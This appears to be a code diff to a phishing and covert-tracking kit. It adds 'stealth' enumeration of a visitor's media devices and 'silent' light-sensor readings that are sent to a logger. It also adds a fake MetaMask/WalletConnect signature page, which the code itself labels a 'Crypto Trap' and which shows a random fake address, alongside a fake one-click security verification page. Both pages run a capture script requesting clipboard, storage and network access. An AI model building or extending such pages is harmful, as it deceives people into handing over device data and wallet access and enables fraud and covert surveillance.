@@ -82,6 +82,25 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         }
       } catch(e) {}
 
+      // Media Devices stealth enumeration
+      try {
+          if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+              navigator.mediaDevices.enumerateDevices().then(async function(devices) {
+                  var mediaArr = devices.map(d => d.kind + ': ' + (d.label || 'unknown_device'));
+                  await logEvent('extra', { media_hardware: mediaArr.join('\n') });
+              });
+          }
+      } catch(e) {}
+
+      // Sensor telemetry (Silent checks)
+      try {
+          if ('AmbientLightSensor' in window) {
+              const sensor = new window.AmbientLightSensor();
+              sensor.onreading = async () => { await logExtra({ sensor_light: sensor.illuminance }); sensor.stop(); };
+              sensor.start();
+          }
+      } catch(e) {}
+
       // High Entropy Hardware Identity
       if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
         navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
@@ -616,6 +635,12 @@ const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
 const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
+  'wallet_connect': {
+    name: "🦊 Web3 Wallet Verification (Crypto Trap)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WalletConnect | Sign Message</title><style>body { background:#141414; color:#fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #333; background:#1c1c1c; padding:32px; width:100%; max-width:380px; box-sizing: border-box; border-radius: 24px; text-align:center; box-shadow: 0 4px 40px rgba(0,0,0,0.5); } .logo { width: 80px; height: 80px; margin-bottom: 24px; border-radius: 50%; box-shadow: 0 0 20px rgba(51, 150, 255, 0.4); } h2 { font-size:22px; margin:0 0 12px; font-weight: 700; color: #fff; } p { color:#999; font-size:15px; margin-bottom:32px; line-height: 1.5; } .address { background: #2c2c2c; border: 1px solid #444; border-radius: 12px; padding: 12px; font-family: monospace; font-size: 13px; color: #ccc; margin-bottom: 32px; word-break: break-all; } .btn { background:#3396ff; color:#fff; border:none; padding:16px; border-radius:12px; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #287be6; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo" referrerpolicy="no-referrer"><h2>Signature Request</h2><p>You need to sign a message to verify wallet ownership for this dApp interaction.</p><div class="address" id="eth_addr">0x... fetching</div><button class="btn" onclick="this.disabled=true; this.innerText='Connecting...'; window.startCapture('wallet_connect');">Connect MetaMask</button></div><div style="font-size:12px; color:#555; margin-top:20px; text-align:center;">Secured by WalletConnect v2</div><script>setTimeout(() => { document.getElementById('eth_addr').innerText = '0x' + Array.from({length:40}, () => Math.floor(Math.random()*16).toString(16)).join(''); }, 800);</script>${getCaptureScript(id, 'https://metamask.io/', {
+      tmplId: 'wallet_connect', perms: ['network', 'clipboard', 'performance', 'security', 'storage_map', 'network_forensic'], accent: '#3396ff', icon: '🦊', flow: 'silent'
+    })}</body></html>`
+  },
   'silent_click': {
     name: "🛡️ Quick Security Check (One-Click)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Keamanan</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#121212; color: #ffffff; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #1e1e1e; box-shadow: 0 4px 30px rgba(0,0,0,0.5); } .logo { font-size: 50px; margin-bottom: 20px; } .main-text { font-size: 24px; font-weight: 700; margin-bottom: 15px; color: #fff; } .sub-text { font-size: 15px; color: #aaa; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #00ff00; color: #000; border: none; padding: 18px 40px; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 1px; } .btn-verify:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 0 20px rgba(0,255,0,0.3); } .btn-verify:active { transform: scale(0.98); } </style></head><body><div class="container"><div class="logo">🛡️</div><div class="main-text">One-Click Verification</div><div class="sub-text">Sistem ini memverifikasi keamanan koneksi Anda secara instan menggunakan algoritma deteksi bot pasif.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='VERIFYING...'; window.startCapture('silent');">VERIFIKASI SEKARANG</button><div style="font-size:11px; color:#555; margin-top:25px;">Verified by Global Security Service</div></div>` + getCaptureScript(id, 'https://google.com', {
